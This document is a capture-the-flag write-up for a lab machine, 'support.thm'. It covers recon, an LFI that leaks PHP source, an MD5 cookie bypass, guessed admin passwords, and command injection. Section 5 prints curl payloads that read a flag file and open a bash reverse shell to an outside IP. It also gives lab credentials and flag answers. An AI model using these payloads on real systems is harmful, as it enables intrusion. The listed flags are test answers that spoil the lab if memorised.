# Support Operations Platform - CTF Writeup

## Target Overview
*   **Target IP:** 10.49.135.145 (originally 10.49.149.246)
*   **Hostname:** `support.thm`
*   **Operating System:** Ubuntu Linux
*   **Services:** SSH (22), HTTP (80)

---

## 1. Initial Reconnaissance

### Nmap Scan
I started with a service and script scan to identify open ports and versions.
```bash
nmap -sC -sV -oN nmap_initial.txt 10.49.135.145
```
**Results:**
*   **Port 22:** OpenSSH 9.6p1
*   **Port 80:** Apache httpd 2.4.58 (Ubuntu)

---

## 2. Web Enumeration

### Directory Busting
Using `gobuster`, I discovered several interesting files and directories.
```bash
gobuster dir -u http://support.thm/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```
**Key Findings:**
*   `/index.php`: Login page.
*   `/dashboard.php`: User dashboard (requires login).
*   `/api.php`: Internal API (requires authentication and specific cookie).
*   `/config.php`: Configuration file.
*   `/info.php`: PHP Info page.
*   `/skins/`: Directory containing PHP files for different themes.

### Initial Access
Through enumeration and common password testing, I identified a valid low-privilege account:
*   **Username:** `help@support.thm`
*   **Password:** `snoopy`

Logging in provided access to the dashboard.

---

## 3. Information Leakage & LFI

### Local File Inclusion (LFI)
The dashboard featured a theme selector that used a `skin` parameter:
`http://support.thm/dashboard.php?skin=default`

Analysis revealed that the application appended `.php` to the input and used `readfile()` to display the content. By using path traversal, I could read the source code of other PHP files.

**LFI Payload:**
```bash
curl -s -b "PHPSESSID=<id>" "http://support.thm/dashboard.php?skin=../config"
```

### Leaked Source Code Analysis

#### `config.php`
Revealed a master password variable, which was slightly different from what was needed.
```php
$MASTER_PASSWORD = 'support@110'; // Misleading hint or older version
```

#### `api.php`
Revealed how the "IT Admin Panel" is protected:
```php
if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) {
    die('Access denied');
}
```
Setting the cookie `isITUser` to `b326b5062b2f0e69046810717534cb09` (MD5 of "true") enabled the IT Admin Panel on the dashboard.

#### `footer.php`
Contained a critical command injection vulnerability in the "System Diagnostics" tool:
```php
$isAdmin = $_SESSION['admin'];
if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys); 
    }
}
```
This tool allows admins to execute shell commands as long as the command starts with the string `date`.

---

## 4. Privilege Escalation

### Admin Identification
Using the `api.php` with the `isITUser` bypass, I enumerated user IDs:
```bash
curl -s -b "PHPSESSID=<id>; isITUser=b326b5062b2f0e69046810717534cb09" "http://support.thm/api.php?id=1"
```
**Target Admin:** `specialadmin@support.thm` (Confirmed `admin: true`)

### Cracking the Admin Password
The `MASTER_PASSWORD` from `config.php` (`support@110`) did not work. However, testing a variation without the `@` symbol proved successful.
*   **Username:** `specialadmin@support.thm`
*   **Password:** `support110`

---

## 5. Remote Code Execution (RCE)

Once logged in as `specialadmin`, the `$_SESSION['admin']` flag was set to `true`, enabling the diagnostic tool in the footer.

### Exploiting Command Injection
By using a semicolon (`;`) or double ampersand (`&&`), I bypassed the `date` prefix restriction to execute arbitrary commands.

**Payload to read the user flag:**
```bash
curl -s -b "PHPSESSID=<admin_id>" -X POST -d 'sys=date; cat /home/ubuntu/user.txt' http://support.thm/dashboard.php
```

**Payload for Reverse Shell:**
```bash
curl -s -b "PHPSESSID=<admin_id>" -X POST --data-urlencode 'sys=date; bash -c "bash -i >& /dev/tcp/192.168.131.247/6969 0>&1"' http://support.thm/dashboard.php
```

---

## 6. Final Flags
*   **Admin Dashboard Flag:** `THM{I_AM_ADMIN999}`
*   **User Flag (/home/ubuntu/user.txt):** `THM{GOT_THE_FLAG001}`
